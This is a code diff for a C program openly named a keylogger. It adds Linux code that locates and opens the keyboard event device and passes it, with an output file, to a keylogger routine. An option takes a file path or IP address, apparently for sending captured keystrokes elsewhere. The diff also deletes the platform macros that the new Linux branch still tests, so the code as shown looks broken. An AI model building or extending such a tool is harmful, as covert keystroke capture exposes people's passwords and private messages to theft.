@@ -2,61 +2,10 @@
 // Created by mallo on 13/12/2022.
 //
 
-/**
- * Determination a platform of an operation system
- * Fully supported supported only GNU GCC/G++, partially on Clang/LLVM
- */
-
-#if defined(_WIN32)
-#define PLATFORM_WINDOWS "windows" // Windows
-    #define PLATFORM_NAME "windows"
-#elif defined(_WIN64)
-#define PLATFORM_WINDOWS "windows" // Windows
-    #define PLATFORM_NAME "windows"
-#elif defined(__CYGWIN__) && !defined(_WIN32)
-#define PLATFORM_WINDOWS "windows" // Windows (Cygwin POSIX under Microsoft Window)
-    #define PLATFORM_NAME "windows"
-#elif defined(__ANDROID__)
-#define PLATFORM_ANDROID "android" // Android (implies Linux, so it must come first)
-    #define PLATFORM_NAME "android"
-#elif defined(__linux__)
-#define PLATFORM_LINUX "linux" // Debian, Ubuntu, Gentoo, Fedora, openSUSE, RedHat, Centos and other
-    #define PLATFORM_NAME "linux"
-#elif defined(__unix__) || !defined(__APPLE__) && defined(__MACH__)
-#include <sys/param.h>
-    #if defined(BSD)
-        #define PLATFORM_BSD "bsd" // FreeBSD, NetBSD, OpenBSD, DragonFly BSD
-        #define PLATFORM_NAME "bsd"
-    #endif
-#elif defined(__hpux)
-#define PLATFORM_HP_UX "hp-ux" // HP-UX
-    #define PLATFORM_NAME "hp-ux"
-#elif defined(_AIX)
-#define PLATFORM_AIX "aix" // IBM AIX
-    #define PLATFORM_NAME "aix"
-#elif defined(__APPLE__) && defined(__MACH__) // Apple OSX and iOS (Darwin)
-#include <TargetConditionals.h>
-    #if TARGET_IPHONE_SIMULATOR == 1
-        #define PLATFORM_IOS "ios" // Apple iOS
-        #define PLATFORM_NAME "ios"
-    #elif TARGET_OS_IPHONE == 1
-        #define PLATFORM_IOS "ios" // Apple iOS
-        #define PLATFORM_NAME "ios"
-    #elif TARGET_OS_MAC == 1
-        #define PLATFORM_OSX "osx" // Apple OSX
-        #define PLATFORM_NAME "osx"
-    #endif
-#elif defined(__sun) && defined(__SVR4)
-#define PLATFORM_SOLARIS "solaris" // Oracle Solaris, Open Indiana
-    #define PLATFORM_NAME "solaris"
-#else
-#define PLATFORM_NULL NULL
-#define PLATFORM_NAME NULL
-#endif
-
 #include <stdio.h>
 #include <stdlib.h>
 #include <getopt.h>
+#include <errno.h>
 #include "keylogger.h"
 
 const char *get_platform_name();
@@ -73,24 +22,40 @@ int main(int argc, char *argv[]) {
     // output file descriptor
     int writeout;
 
+    // keyboard file descriptor
+    // only for linux usage
+    int keyboard = 0;
+
     // option value
+    // file path or ip address
     const char *option_input = parse_options(argc, argv);
 
     // both or neither options are given, not permitted
-    if(network == file){
+    if(network == file) {
         print_usage_and_quit(argv[0]);
     }
-    /*
     else if(file) {
         if((writeout = open(option_input, O_WRONLY | O_APPEND | O_CREAT, S_IROTH)) < 0){
             printf("Error opening file %s: %s\n", argv[2], strerror(errno));
             return 1;
         }
     }
-    */
 
-    keylogger(writeout);
-    //close(writeout);
+    #if defined(PLATFORM_LINUX)
+
+    char *KEYBOARD_DEVICE = get_keyboard_event_file();
+    if(!KEYBOARD_DEVICE){
+        print_usage_and_quit(argv[0]);
+    }
+
+    if((keyboard = open(KEYBOARD_DEVICE, O_RDONLY)) < 0){
+        printf("Error accessing keyboard from %s. May require you to be superuser\n", KEYBOARD_DEVICE);
+        return 1;
+    }
+    #endif
+
+    keylogger(keyboard, writeout);
+    close(writeout);
 
 }
 
